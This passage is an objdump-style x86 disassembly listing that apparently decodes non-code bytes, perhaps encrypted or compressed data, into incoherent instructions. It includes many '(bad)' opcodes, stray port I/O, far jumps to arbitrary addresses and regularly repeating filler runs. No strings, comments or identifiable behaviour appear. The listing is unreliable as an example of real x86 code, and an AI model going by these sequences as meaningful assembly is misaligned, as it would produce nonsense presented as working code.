  41695e:	sub    DWORD PTR [edi-0x5d],edi
  416961:	mov    ebp,0x8d45922c
  416966:	repz add BYTE PTR [bx+si],al
  41696a:	add    BYTE PTR [ecx],al
  41696c:	add    BYTE PTR [eax],al
  41696e:	sbb    al,0x88
  416970:	jl     0x416945
  416972:	imul   edi,DWORD PTR [ebp-0x3a9f92da],0xffffffb6
  416979:	push   0xfffffffa
  41697b:	dec    esi
  41697c:	lods   eax,DWORD PTR ds:[esi]
  41697d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41697e:	jno    0x416935
  416980:	(bad)  
  416981:	jmp    0x25ec7e23
  416986:	jmp    0x786d:0xb4068b8c
  41698d:	sbb    ebp,esp
  41698f:	cmp    eax,0xf2fab17e
  416994:	dec    esi
  416995:	mov    edx,0x7b286dc7
  41699a:	jl     0x41696c
  41699c:	sbb    esp,DWORD PTR [ecx]
  41699e:	xchg   ebp,eax
  41699f:	clc    
  4169a0:	or     al,0xab
  4169a2:	push   es
  4169a3:	test   eax,0xd0fb7ea1
  4169a8:	xor    al,BYTE PTR [edx-0x3f351e3a]
  4169ae:	stos   BYTE PTR es:[edi],al
  4169af:	xchg   edx,eax
  4169b0:	inc    ebp
  4169b1:	add    DWORD PTR [edi],edx
  4169b3:	ins    BYTE PTR es:[edi],dx
  4169b4:	push   esp
  4169b5:	mov    dh,0x57
  4169b7:	and    ah,0x1a
  4169ba:	aad    0xd5
  4169bc:	push   0x532ce678
  4169c1:	jnp    0x416a01
  4169c3:	in     al,0x1b
  4169c5:	and    DWORD PTR [ebp-0x70],0xfffffff2
  4169c9:	inc    edx
  4169ca:	int3   
  4169cb:	ss push edx
  4169cd:	xor    edi,DWORD PTR [ecx+0x215bb4ec]
  4169d3:	mov    eax,0x42a4e866
  4169d8:	jns    0x416a43
  4169da:	mov    ds:0xab7e20c1,al
  4169df:	fild   QWORD PTR [esi+ebp*2-0xab5c837]
  4169e6:	jecxz  0x416a22
  4169e8:	fsubr  DWORD PTR ds:0x885b36ec
  4169ee:	dec    ecx
  4169ef:	addr16 adc esi,edi
  4169f2:	dec    edx
  4169f3:	icebp  
  4169f4:	push   edx
  4169f5:	sub    BYTE PTR [esi-0x47],dh
  4169f8:	sti    
  4169f9:	jg     0x416a50
  4169fb:	call   0x663a0963
  416a00:	and    BYTE PTR [edx-0x1b],ch
  416a03:	stos   BYTE PTR es:[edi],al
  416a04:	jnp    0x4169d0
  416a06:	addr16 mov ecx,ecx
  416a09:	adc    eax,eax
  416a0b:	loop   0x416a16
  416a0d:	mov    ds:0x6f23f563,al
  416a12:	pop    edx
  416a13:	dec    ebx
  416a14:	retf   0x6f19
  416a17:	cmp    BYTE PTR [ebx-0x5fcbbca7],cl
  416a1d:	sbb    edx,esp
  416a1f:	add    DWORD PTR [ebp+esi*1+0x7b],0x41
  416a24:	ret    0xa6d0
  416a27:	add    dh,BYTE PTR [edx-0x2e8a4d30]
  416a2d:	shl    DWORD PTR [edi-0x6],0x32
  416a31:	and    BYTE PTR [ebp-0x1be4bda1],ah
  416a37:	sbb    bh,BYTE PTR [ecx]
  416a39:	xlat   BYTE PTR ds:[ebx]
  416a3a:	les    edx,FWORD PTR [ecx-0x1d]
  416a3d:	pop    eax
  416a3e:	mov    ds:0x2a7445f8,eax
  416a43:	(bad)  
  416a46:	call   DWORD PTR [ebp-0x40ea1ce8]
  416a4c:	ds call 0xd8777d4f
  416a52:	js     0x416a22
  416a54:	pop    ecx
  416a55:	xchg   esp,eax
  416a56:	mov    eax,ds:0xda38370f
  416a5b:	dec    eax
  416a5c:	fld    TBYTE PTR [ebp+0x130cdb44]
  416a62:	push   esp
  416a63:	jl     0x416a14
  416a65:	sahf   
  416a66:	pop    ebp
  416a67:	sbb    al,0x34
  416a69:	or     DWORD PTR [edx+0xb86371],ebp
	...
  416ad3:	add    BYTE PTR [eax],al
  416ad5:	add    bl,cl
  416ad7:	pusha  
  416ad8:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416ade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416adf:	mov    al,ds:0x62220ba3
  416ae4:	inc    ecx
  416ae5:	dec    ebx
  416ae6:	addr16 hlt 
  416ae8:	add    BYTE PTR [eax],al
  416aea:	add    BYTE PTR [ecx],al
  416aec:	add    BYTE PTR [eax],al
  416aee:	and    bh,BYTE PTR [ecx-0x2f]
  416af1:	jmp    0xcae14732
  416af6:	ret    
  416af7:	pop    edi
  416af8:	scas   eax,DWORD PTR es:[edi]
  416af9:	mov    dl,0xa0
  416afb:	mov    eax,0xd26a9998
  416b00:	and    edi,DWORD PTR [edi]
  416b02:	ins    DWORD PTR es:[edi],dx
  416b03:	mov    bh,0xa
  416b05:	xchg   BYTE PTR [ecx],cl
  416b07:	mov    bl,0x2c
  416b09:	in     eax,0xe5
  416b0b:	sbb    DWORD PTR [ebx-0x80],0x5f
  416b0f:	jae    0x416b27
  416b11:	xor    DWORD PTR [esi-0x62],esp
  416b14:	sub    ch,bh
  416b16:	cld    
  416b17:	mov    ah,0xbd
  416b19:	cmp    BYTE PTR [edx],dh
  416b1b:	pushf  
  416b1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b1e:	loopne 0x416b1a
  416b20:	inc    ecx
  416b21:	fstp   TBYTE PTR [eax]
  416b23:	fld    QWORD PTR [edi+0x12d42c75]
  416b29:	add    al,0x54
  416b2b:	push   cs
  416b2c:	imul   esi,DWORD PTR [eax+0x22482bc4],0x2f52aaa4
  416b36:	(bad)
  416b3b:	in     al,0x89
  416b3d:	lods   al,BYTE PTR ds:[esi]
  416b3e:	mov    ebp,0x655a0eed
  416b43:	lahf   
  416b44:	lahf   
  416b45:	xor    esi,DWORD PTR [eax]
  416b47:	in     al,0x3b
  416b49:	popf   
  416b4a:	sub    eax,0x6eec0c97
  416b4f:	mov    esp,0x96d08ed
  416b54:	sub    BYTE PTR [ebp+0x76],cl
  416b57:	cmp    ch,ah
  416b59:	and    ecx,DWORD PTR [edx]
  416b5b:	lods   eax,DWORD PTR ds:[esi]
  416b5c:	inc    ebp
  416b5d:	xlat   BYTE PTR ds:[ebx]
  416b5e:	js     0x416b6f
  416b60:	cmp    DWORD PTR [edi-0x5946a524],0x29f3ee3a
  416b6a:	cs fcmovne st,st(4)
  416b6d:	pop    esi
  416b6e:	mov    ebp,0x31567970
  416b73:	mov    ebp,0x4175573a
  416b78:	or     eax,0x13844ee8
  416b7d:	adc    BYTE PTR [edi-0x4e],cl
  416b80:	icebp  
  416b81:	add    DWORD PTR [ecx-0x4a],esp
  416b84:	cmp    al,0x59
  416b86:	iret   
  416b87:	inc    ebp
  416b88:	clc    
  416b89:	jmp    0xb365:0x28c99d4
  416b90:	push   cs
  416b91:	jno    0x416bc5
  416b93:	or     eax,0x14f6f6a6
  416b98:	in     eax,dx
  416b99:	iret   
  416b9a:	dec    esp
  416b9b:	into   
  416b9c:	cmp    edi,edx
  416b9e:	scas   eax,DWORD PTR es:[edi]
  416b9f:	pop    ebp
  416ba0:	mov    bl,0x5c
  416ba2:	fcomip st,st(5)
  416ba4:	shl    DWORD PTR [ebx],1
  416ba6:	adc    edx,esp
  416ba8:	mov    eax,ds:0x3ee529c8
  416bad:	adc    BYTE PTR [ecx+ebx*2+0x24f185c4],cl
  416bb4:	sub    eax,0xfb8643a9
  416bb9:	cdq    
  416bba:	jns    0x416b6b
  416bbc:	jb     0x416b66
  416bbe:	adc    dl,ah
  416bc0:	pusha  
  416bc1:	pop    edi
  416bc2:	fisubr DWORD PTR [ebp-0x50]
  416bc5:	adc    ch,cl
  416bc7:	push   cs
  416bc8:	inc    eax
  416bc9:	fcom   st(3)
  416bcb:	mov    ah,0x59
  416bcd:	test   ah,bh
  416bcf:	hlt    
  416bd0:	xchg   ebp,eax
  416bd1:	xchg   BYTE PTR [edx+0x1154cae9],dl
  416bd7:	and    eax,0xd0be9f91
  416bdc:	loope  0x416c5b
  416bde:	cmp    DWORD PTR [ecx-0x4],esi
  416be1:	pop    edx
  416be2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416be3:	loope  0x416bd8
  416be5:	pop    edx
  416be6:	xor    dh,ah
  416be8:	mov    bl,0xce
  416bea:	fdivr  st(4),st
  416bec:	pop    ebx
  416bed:	out    dx,eax
	...
  416c56:	jecxz  0x416cbd
  416c58:	push   cs
  416c59:	test   DWORD PTR [esi-0x38a0401],0x105b70a9
  416c63:	std    
  416c64:	push   esp
  416c65:	adc    DWORD PTR [edi-0xb],esp
  416c68:	add    BYTE PTR [eax],al
  416c6a:	add    BYTE PTR [ecx],al
  416c6c:	add    BYTE PTR [eax],al
  416c6e:	xchg   DWORD PTR [edx],eax
  416c70:	dec    eax
  416c71:	mov    ebx,0x975b69ef
  416c76:	mov    WORD PTR [eax+ebp*1-0x51],?
  416c7a:	popa   
  416c7b:	or     eax,0xcf7fd5a2
  416c80:	in     al,0xe8
  416c82:	outs   dx,DWORD PTR ds:[esi]
  416c83:	mov    eax,0x8ee4faac
  416c88:	push   esi
  416c89:	and    eax,0x571d7a10
  416c8e:	ror    DWORD PTR [eax+0x4f],1
  416c91:	daa    
  416c92:	pop    ebp
  416c93:	fsub   DWORD PTR ds:0x32018f52
  416c99:	arpl   WORD PTR [eax],di
  416c9b:	ins    BYTE PTR es:[edi],dx
  416c9c:	into   
  416c9d:	scas   al,BYTE PTR es:[edi]
  416c9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c9f:	and    BYTE PTR [esi-0x111133b8],dl
  416ca5:	jmp    0x416c98
  416ca7:	hlt    
  416ca8:	and    eax,ecx
  416caa:	lahf   
  416cab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cac:	daa    
  416cad:	shl    eax,cl
  416caf:	repz pop es
  416cb1:	sti    
  416cb2:	fstp   TBYTE PTR [ebx-0x64]
  416cb5:	adc    cl,BYTE PTR [esi]
  416cb7:	or     BYTE PTR [ebp+0x4f],ah
  416cba:	push   esi
  416cbb:	mov    WORD PTR [edi],?
  416cbd:	adc    eax,0x90600ccf
  416cc2:	call   0x2281:0x74cb063f
  416cc9:	retf   
  416cca:	mov    eax,ds:0x64a01a89
  416ccf:	mov    ah,0xf1
  416cd1:	pop    es
  416cd2:	bound  ebx,QWORD PTR [edi+0x1986f7bd]
  416cd8:	or     esi,edi
  416cda:	mov    edi,0x9836d9ff
  416cdf:	mov    esp,0xb4ac86a3
  416ce4:	test   eax,0x3a573814
  416ce9:	neg    DWORD PTR [esi+ecx*1]
  416cec:	repnz (bad) 
  416cee:	cmc    
  416cef:	xchg   DWORD PTR [ebx-0x11],ecx
  416cf2:	(bad)  
  416cf3:	(bad)  
  416cf4:	adc    eax,0xb3f12ed5
  416cf9:	xchg   DWORD PTR [esi],edi
  416cfb:	lahf   
  416cfc:	pop    edi
  416cfd:	mov    cl,0x7d
  416cff:	jmp    0x416cd1
  416d01:	add    eax,0xf0681797
  416d06:	stc    
  416d07:	mov    esp,0xe1f0ab5e
  416d0c:	lock jno 0x416d51
  416d0f:	les    esi,FWORD PTR [edx+0x6f]
  416d12:	mov    dl,0xe8
  416d14:	mov    al,ds:0xe2b5cf66
  416d1a:	fst    DWORD PTR [eax-0x2b]
  416d1d:	das    
  416d1e:	test   eax,0x4815b363
  416d23:	mov    bh,0x23
  416d25:	push   ecx
  416d26:	or     DWORD PTR [edx+0x2155d213],edx
  416d2c:	ss adc al,cl
  416d2f:	push   edx
  416d30:	push   edx
  416d31:	sar    DWORD PTR [ecx+0x2b5d9299],cl
  416d37:	adc    eax,0x7dfa3177
  416d3c:	mov    al,ds:0x5e073794
  416d41:	test   BYTE PTR [eax-0x4e792333],bl
  416d47:	inc    ebx
  416d48:	dec    eax
  416d49:	xor    BYTE PTR [edi+edi*2],cl
  416d4c:	daa    
  416d4d:	xor    DWORD PTR [edi-0x52],edi
  416d50:	cdq    
  416d51:	hlt    
  416d52:	fmul   st(6),st
  416d54:	out    dx,eax
  416d55:	and    edi,DWORD PTR [esi+edx*4]
  416d58:	out    dx,al
  416d59:	and    BYTE PTR [edx-0x11667807],ah
  416d5f:	outs   dx,BYTE PTR ds:[esi]
  416d60:	adc    eax,0xceb1d9be
  416d65:	out    dx,eax
  416d66:	sub    BYTE PTR [ecx+0x3b],0x88
  416d6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d6b:	pop    esi
  416d6c:	xor    al,0xbb
	...
  416dd6:	and    DWORD PTR [ebx-0x40445077],edx
  416ddc:	daa    
  416ddd:	lahf   
  416dde:	mov    ch,0x99
  416de0:	pop    edx
  416de1:	das    
  416de2:	push   ss
  416de3:	call   0x0:0xf6672b24
  416dea:	add    BYTE PTR [ecx],al
  416dec:	add    BYTE PTR [eax],al
  416dee:	enter  0xbaba,0x81
  416df2:	mov    eax,0x2763c397
  416df7:	mov    al,ds:0x5fc73781
  416dfc:	sbb    eax,0xedd4803c
  416e01:	imul   ebx,DWORD PTR [esi],0x0
  416e04:	sbb    al,BYTE PTR [ecx-0x64]
  416e07:	fst    DWORD PTR [ebp+0x5903c318]
  416e0d:	inc    edi
  416e0e:	iret   
  416e0f:	xor    BYTE PTR [edx],bh
  416e11:	jp     0x416dcd
  416e13:	xchg   esi,eax
  416e14:	add    edi,DWORD PTR [edx-0x4b]
  416e17:	cmp    BYTE PTR [ecx],bl
  416e19:	push   esi
  416e1a:	ins    DWORD PTR es:[edi],dx
  416e1b:	adc    WORD PTR [ebx+ecx*2-0xd],si
  416e20:	mov    al,ds:0x5e1314ff
  416e25:	outs   dx,DWORD PTR ds:[esi]
  416e26:	mov    esi,0xf1cc21e6
  416e2b:	push   edi
  416e2c:	int3   
  416e2d:	ficomp DWORD PTR fs:[eax+0x4f]
  416e31:	clc    
  416e32:	mov    ds:0x5afbfd01,eax
  416e37:	lods   eax,DWORD PTR ds:[esi]
  416e38:	iret   
  416e39:	stc    
  416e3a:	jo     0x416e57
  416e3c:	loopne 0x416e36
  416e3e:	ficomp DWORD PTR [edx-0x7]
  416e41:	mov    ds:0xca8bbc70,eax
  416e46:	loopne 0x416e4b
  416e48:	(bad)  
  416e49:	ins    BYTE PTR es:[edi],dx
  416e4a:	(bad)  
  416e4b:	jbe    0x416e45
  416e4d:	shl    esi,1
  416e4f:	in     eax,0xa9
  416e51:	and    al,0xfa
  416e53:	adc    dh,cl
  416e55:	xchg   ebp,eax
  416e56:	dec    esi
  416e57:	xchg   DWORD PTR [esi+eax*8-0x74e2935d],edx
  416e5e:	push   es
  416e5f:	mov    dl,0x11
  416e61:	jecxz  0x416e88
  416e63:	jg     0x416eb3
  416e65:	ss aaa 
  416e67:	jb     0x416ec0
  416e69:	in     al,0x9e
  416e6b:	out    dx,eax
  416e6c:	fwait
  416e6d:	cdq    
  416e6e:	out    0x85,al
  416e70:	adc    ch,BYTE PTR [edx-0x76]
  416e73:	pop    ds
  416e74:	mov    ecx,0xcf1f1695
  416e79:	into   
  416e7a:	push   cs
  416e7b:	cmp    DWORD PTR [esi+0x2730ed2a],eax
  416e81:	xchg   ecx,eax
  416e82:	std    
  416e83:	pop    es
  416e84:	inc    ebp
  416e85:	(bad)
  416e88:	or     DWORD PTR [edx-0x5bdc6a6],eax
  416e8e:	test   eax,0x72aa20ee
  416e93:	or     edi,DWORD PTR [ebx]
  416e95:	or     esi,DWORD PTR [ebx-0x6768a567]
  416e9b:	fidiv  WORD PTR ds:0xc5c8328f
  416ea1:	lds    esp,FWORD PTR [ecx-0x2161c2fc]
  416ea7:	pop    es
  416ea8:	sub    eax,0x2e5be258
  416ead:	jnp    0x416f19
  416eaf:	jae    0x416f19
  416eb1:	jg     0x416ea5
  416eb3:	inc    esp
  416eb4:	jp     0x416f1c
  416eb6:	jns    0x416f1d
  416eb8:	jp     0x416eb6
  416eba:	fnstsw WORD PTR ds:0xb6ffdaa6
  416ec0:	push   ecx
  416ec1:	pop    ebp
  416ec2:	dec    ecx
  416ec3:	cdq    
  416ec4:	mov    cl,0x9
  416ec6:	rcr    dh,cl
  416ec8:	or     eax,DWORD PTR [esp+eax*2-0x7b]
  416ecc:	test   eax,0xc212b3c9
  416ed1:	or     al,BYTE PTR [edx]
  416ed3:	pop    ebp
  416ed4:	dec    esi
  416ed5:	in     eax,0xa
  416ed7:	xchg   dh,dl
  416ed9:	in     eax,0xb5
  416edb:	scas   al,BYTE PTR es:[edi]
  416edc:	push   ds
  416edd:	jnp    0x416e90
  416edf:	xchg   DWORD PTR [edi-0x3b7706e1],ebx
  416ee5:	xchg   ebx,eax
  416ee6:	ins    DWORD PTR es:[edi],dx
  416ee7:	fcom   QWORD PTR [eax+0x3d]
  416eea:	inc    esi
  416eeb:	lods   al,BYTE PTR ds:[esi]
  416eec:	pushf  
  416eed:	mov    eax,ds:0x0
	...
  416f56:	mov    edi,0xae6d8e19
  416f5b:	(bad)  
  416f5c:	(bad)  
  416f5d:	fucomi st,st(0)
  416f5f:	xor    eax,0x92c48eea
  416f64:	dec    edi
  416f65:	xchg   edx,eax
  416f66:	test   DWORD PTR [bx+si],0x10000
  416f6d:	add    BYTE PTR [eax-0x4d33d79c],ch
  416f73:	dec    ecx
  416f74:	hlt    
  416f75:	imul   eax,DWORD PTR [ecx],0xffffffa3
  416f78:	mov    ss,WORD PTR [edx+0x632921c2]
  416f7e:	ja     0x416fdb
  416f80:	pop    ss
  416f81:	ficomp WORD PTR [eax+0x2af15609]
  416f87:	jns    0x417006
  416f89:	stc    
  416f8a:	add    BYTE PTR [eax],ah
  416f8c:	jecxz  0x416f27
  416f8e:	(bad)  
  416f8f:	mov    bl,0xfb
  416f91:	stos   DWORD PTR es:[edi],eax
  416f92:	bnd jl 0x416fce
  416f95:	aaa    
  416f96:	pop    ebp
  416f97:	sub    al,0xda
  416f99:	mov    ebx,0x35a52bf6
  416f9e:	mov    ecx,0x8d807421
  416fa3:	js     0x416f92
  416fa5:	test   DWORD PTR [ecx+0x4],esi
  416fa8:	or     ecx,DWORD PTR [eax-0x1adb5bb6]
  416fae:	shl    BYTE PTR [edx-0x5d77d76c],0xb8
  416fb5:	or     edx,DWORD PTR [edx]
  416fb7:	or     bl,0xd0
  416fba:	add    ch,dh
  416fbc:	push   edi
  416fbd:	cmp    dh,BYTE PTR [ecx+0x29]
  416fc0:	push   ebp
  416fc1:	(bad)  
  416fc2:	leave  
  416fc3:	add    esp,esp
  416fc5:	xchg   ebp,eax
  416fc6:	scas   al,BYTE PTR es:[edi]
  416fc7:	cdq    
  416fc8:	xor    DWORD PTR [ebp+0x57da47af],esi
  416fce:	fs cmp ebx,ecx
  416fd1:	rcl    dh,1
  416fd3:	scas   al,BYTE PTR es:[edi]
  416fd4:	cwde   
  416fd5:	dec    esp
  416fd6:	jge    0x417025
  416fd8:	push   eax
  416fd9:	push   ss
  416fda:	and    al,BYTE PTR [ebp-0x5088610c]
  416fe0:	pop    ebp
  416fe1:	outs   dx,DWORD PTR ds:[esi]
  416fe2:	repnz xlat BYTE PTR fs:[ebx]
  416fe5:	sbb    dh,0x6
  416fe8:	test   ch,cl
  416fea:	cmp    eax,0x938b0759
  416fef:	jne    0x416f83
  416ff1:	mov    DWORD PTR [esi],esp
  416ff3:	jb     0x416fc9
  416ff5:	adc    eax,0x56a185ba
  416ffa:	mov    ds:0x86e0814e,al
  416fff:	mov    ds:0xd43d06f6,eax
  417004:	out    0x8a,eax
  417006:	cmp    DWORD PTR [edi],ebp
  417008:	sbb    DWORD PTR [ecx+0x5b],ecx
  41700b:	daa    
  41700c:	xor    ebp,DWORD PTR [edi]
  41700e:	fcomp  QWORD PTR [ebx]
  417010:	ror    DWORD PTR [edx-0x45],1
  417013:	jmp    0x8ee9ccd3
  417018:	pop    es
  417019:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41701a:	xor    DWORD PTR [edx-0x3],esp
  41701d:	test   ebx,0x1c415d00
  417023:	cmc    
  417024:	test   ecx,ebp
  417026:	sbb    eax,0x94972ec8
  41702b:	add    DWORD PTR [ebx+0x9b24b16],edx
  417031:	gs inc ecx
  417033:	mov    WORD PTR [edx+ebp*2],fs
  417036:	mov    ds:0xfe67bfd6,eax
  41703b:	jp     0x416fdd
  41703d:	xor    DWORD PTR [eax-0xed43f2f],ebp
  417043:	into   
  417044:	dec    ebx
  417045:	lahf   
  417046:	xchg   ebx,eax
  417047:	dec    ebp
  417048:	fstp   DWORD PTR [edx-0x72c9edd9]
  41704e:	out    dx,eax
  41704f:	ja     0x41706b
  417051:	push   ebx
  417052:	add    eax,DWORD PTR [esp+esi*1+0x69]
  417056:	loope  0x41701b
  417058:	mov    ds:0xa9b4c0e6,eax
  41705d:	(bad)  
  41705e:	ins    DWORD PTR es:[edi],dx
  41705f:	mov    bl,0x9a
  417061:	sbb    dl,bh
  417063:	xchg   edi,eax
  417064:	jmp    0x24ea:0xf8d8041b
  41706b:	pusha  
  41706c:	aad    0xfc
	...
  4170d6:	jbe    0x417105
  4170d8:	push   ebp
  4170d9:	inc    ecx
  4170da:	pop    edi
  4170db:	jns    0x417153
  4170dd:	aas    
  4170de:	(bad)  
  4170df:	loopne 0x4170d5
  4170e1:	sub    esp,DWORD PTR [edi]
  4170e3:	popf   
  4170e4:	outs   dx,DWORD PTR ds:[esi]
  4170e5:	clc    
  4170e6:	addr16 clc 
  4170e8:	add    BYTE PTR [eax],al
  4170ea:	add    BYTE PTR [ecx],al
  4170ec:	add    BYTE PTR [eax],al
  4170ee:	mov    cl,0x24
  4170f0:	push   edi
  4170f1:	ins    BYTE PTR es:[edi],dx
  4170f2:	lahf   
  4170f3:	and    ecx,DWORD PTR [ebp+0x17]
  4170f6:	lahf   
  4170f7:	test   DWORD PTR [esi+edi*2+0xff4d16d],0x31fb7174
  417102:	jmp    0x417127
  417104:	mov    ecx,0x48e29002
  417109:	jl     0x417092
  41710b:	(bad)  
  41710d:	into   
  41710e:	leave  
  41710f:	mov    edi,DWORD PTR [edi]
  417111:	xchg   esi,eax
  417112:	xor    eax,0xb8ce73b2
  417117:	shl    BYTE PTR [ebp+ebx*8+0x1af5e42d],0x9c
  41711f:	adc    cl,BYTE PTR [ebp-0x55]
  417122:	sti    
  417123:	push   ebx
  417124:	cmp    eax,0x97bf7cb8
  417129:	mov    ebx,0xe8fbf7f6
  41712e:	in     al,dx
  41712f:	mov    eax,ds:0xecfaff
  417134:	cs loope 0x417150
  417137:	stos   DWORD PTR es:[edi],eax
  417138:	sub    esp,DWORD PTR [ecx+0x38012edf]
  41713e:	loopne 0x4171b3
  417140:	push   ebp
  417141:	leave  
  417142:	call   0xcca8db84
  417147:	int3   
  417148:	xchg   esi,ebp
  41714a:	pop    ss
  41714b:	aad    0xa3
  41714d:	inc    eax
  41714e:	(bad)  
  417150:	js     0x41713b
  417152:	xor    eax,0x532326fb
  417157:	cmp    BYTE PTR [ebp+eiz*2-0x51],cl
  41715b:	jle    0x417148
  41715d:	fwait
  41715e:	mov    dh,0xa3
  417160:	sbb    DWORD PTR [edi],ebx
  417162:	cld    
  417163:	ror    BYTE PTR [ecx+0x4f],0x47
  417167:	enter  0xcbf0,0x5
  41716b:	mov    DWORD PTR [ebp+0x399844f],edi
  417171:	ja     0x417199
  417173:	inc    esp
  417174:	fild   DWORD PTR [esi+0x36]
  417177:	jmp    0xdf376070
  41717c:	jecxz  0x4171a7
  41717e:	out    dx,eax
  41717f:	int3   
  417180:	xor    eax,0x6adfaadc
  417185:	jae    0x4171a8
  417187:	dec    ebx
  417188:	test   eax,0x5165b2ba
  41718d:	cdq    
  41718e:	xchg   esi,eax
  41718f:	cmp    BYTE PTR [ebx+0x39a0954a],ch
  417195:	and    DWORD PTR [ecx],ebp
  417197:	push   ebp
  417198:	xchg   esi,eax
  417199:	push   edi
  41719a:	cdq    
  41719b:	sahf   
  41719c:	push   ds
  41719d:	adc    bh,0xfc
  4171a0:	or     ch,cl
  4171a2:	mov    WORD PTR [ecx+0x52b1252f],cs
  4171a8:	in     eax,0x6f
  4171aa:	in     eax,0x53
  4171ac:	or     DWORD PTR [ebx+eiz*1+0x179ebe33],ecx
  4171b3:	and    edx,DWORD PTR [ebx+ecx*8+0x366e91b3]
  4171ba:	cmp    DWORD PTR [ebx-0x6db33220],edx
  4171c0:	enter  0xcc30,0x46
  4171c4:	call   FWORD PTR [edx-0x69]
  4171c7:	push   0x28
  4171c9:	adc    al,0xdc
  4171cb:	adc    eax,0x2cabd84d
  4171d0:	mov    esp,0x2c80df4b
  4171d5:	or     cl,BYTE PTR [esi+0x75]
  4171d8:	adc    al,0xd1
  4171da:	mov    edi,0x3abd25a2
  4171df:	mov    esi,0x2f9fa70a
  4171e4:	push   eax
  4171e5:	les    edx,FWORD PTR [ecx-0x64588a0d]
  4171eb:	or     ch,BYTE PTR [eax-0x7d]
	...
  417256:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417257:	sbb    DWORD PTR [eax+0x1a],esi
  41725a:	(bad)  
  41725b:	jnp    0x41724b
  41725d:	mov    ebp,0x986526a4
  417262:	jnp    0x4172a1
  417264:	daa    
  417265:	mov    al,0x67
  417267:	stc    
  417268:	add    BYTE PTR [eax],al
  41726a:	add    BYTE PTR [ecx],al
  41726c:	add    BYTE PTR [eax],al
  41726e:	or     edi,edx
  417270:	sbb    BYTE PTR [edi-0x17],dh
  417273:	pop    edx
  417274:	or     ebx,DWORD PTR ds:0xfdd1aa02
  41727a:	mov    ds:0x6f5a1ffd,al
  41727f:	mov    cl,0xc4
  417281:	xchg   edi,eax
  417282:	push   esp
  417283:	shr    DWORD PTR [ecx],1
  417285:	(bad)  
  417287:	scas   al,BYTE PTR es:[edi]
  417288:	xlat   BYTE PTR ds:[ebx]
  417289:	sti    
  41728a:	stc    
  41728b:	dec    edi
  41728c:	pop    esi
  41728d:	sub    BYTE PTR [esi+0x43cf5673],0xbb
  417294:	xlat   BYTE PTR ds:[ebx]
  417295:	jnp    0x4172f7
  417297:	and    esi,esp
  417299:	adc    al,0x4
  41729b:	fstp   DWORD PTR [eax+0x63519a17]
  4172a1:	pop    esi
  4172a2:	xor    BYTE PTR [edx],dl
  4172a4:	pop    ds
  4172a5:	iret   
  4172a6:	pop    ecx
  4172a7:	imul   edx,DWORD PTR [ebx],0xda2f3c2a
  4172ad:	xchg   ebx,eax
  4172ae:	jp     0x41727f
  4172b0:	mov    bl,BYTE PTR [edx+ecx*4-0x14]
  4172b4:	add    eax,0x2ec2033d
  4172b9:	ins    DWORD PTR es:[edi],dx
  4172ba:	imul   esi,DWORD PTR [esi+0xe4670d1],0xffffff93
  4172c1:	fistp  WORD PTR [esi+0x23]
  4172c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172c5:	mov    ebx,0xe022fb5d
  4172ca:	jp     0x41728e
  4172cc:	pop    ds
  4172cd:	ret    
  4172ce:	stos   BYTE PTR es:[edi],al
  4172cf:	sar    ah,cl
  4172d1:	in     eax,dx
  4172d2:	std    
  4172d3:	cmp    edi,esp
  4172d5:	add    BYTE PTR [edi+0x406a50ce],al
  4172db:	in     eax,0xbf
  4172dd:	inc    ebp
  4172de:	frstor [eax+ebp*4+0x26b412bd]
  4172e5:	mov    ah,0x75
  4172e7:	mul    BYTE PTR gs:[ebx+0x41]
  4172eb:	ds aam 0xf4
  4172ee:	mov    esp,0xf7551544
  4172f3:	das    
  4172f4:	or     BYTE PTR [ebp+esi*4-0x141782d3],0x92
  4172fc:	adc    al,0x84
  4172fe:	aad    0x3a
  417300:	outs   dx,BYTE PTR ds:[esi]
  417301:	imul   edi,DWORD PTR [edx+0x65],0xffffffbc
  417305:	fwait
  417306:	xchg   edi,eax
  417307:	idiv   DWORD PTR [ebx+0x44]
  41730a:	jmp    0x3beb98ee
  41730f:	push   cs
  417310:	and    BYTE PTR [esi],ch
  417312:	ins    BYTE PTR es:[edi],dx
  417313:	sub    al,0xf0
  417315:	and    DWORD PTR [ecx],0x5b
  417318:	jnp    0x4172f7
  41731a:	sbb    dh,BYTE PTR [esi]
  41731c:	cmp    ebp,ecx
  41731e:	xor    DWORD PTR [ebx-0x5d165757],ebp
  417324:	ja     0x4172c5
  417326:	fcmovne st,st(1)
  417328:	add    ah,bl
  41732a:	into   
  41732b:	sbb    BYTE PTR gs:[ebx],0xb5
  41732f:	adc    eax,0x26d6c602
  417334:	pop    ds
  417335:	dec    ebp
  417336:	stc    
  417337:	and    esi,DWORD PTR [ebp+0x43]
  41733a:	stos   DWORD PTR es:[edi],eax
  41733b:	xor    eax,0x49772d65
  417340:	ins    BYTE PTR es:[edi],dx
  417341:	mov    eax,ds:0x161a8109
  417346:	jmp    0x4173bd
  417348:	xor    DWORD PTR [ebp+0x68],ebx
  41734b:	mov    cl,ah
  41734d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41734e:	jb     0x4172ff
  417350:	fincstp 
  417352:	jle    0x4173a0
  417354:	pop    eax
  417355:	pop    ss
  417356:	sti    
  417357:	sbb    eax,0xa2901cc8
  41735c:	ins    BYTE PTR es:[edi],dx
  41735d:	xchg   ecx,eax
  41735e:	add    BYTE PTR [ecx],dh
  417360:	add    dl,BYTE PTR [ecx-0x6]
  417363:	in     eax,dx
  417364:	add    DWORD PTR [esi-0x6817f8d9],esi
  41736a:	add    BYTE PTR [ebx+0x2b],0x8d
	...
  4173d6:	imul   edi,DWORD PTR [edi+edx*8-0x168028a2],0x8016bbf
  4173e1:	gs dec edx
  4173e3:	lods   al,BYTE PTR ds:[esi]
  4173e4:	jge    0x4173da
  4173e6:	addr16 cli 
  4173e8:	add    BYTE PTR [eax],al
  4173ea:	add    BYTE PTR [ecx],al
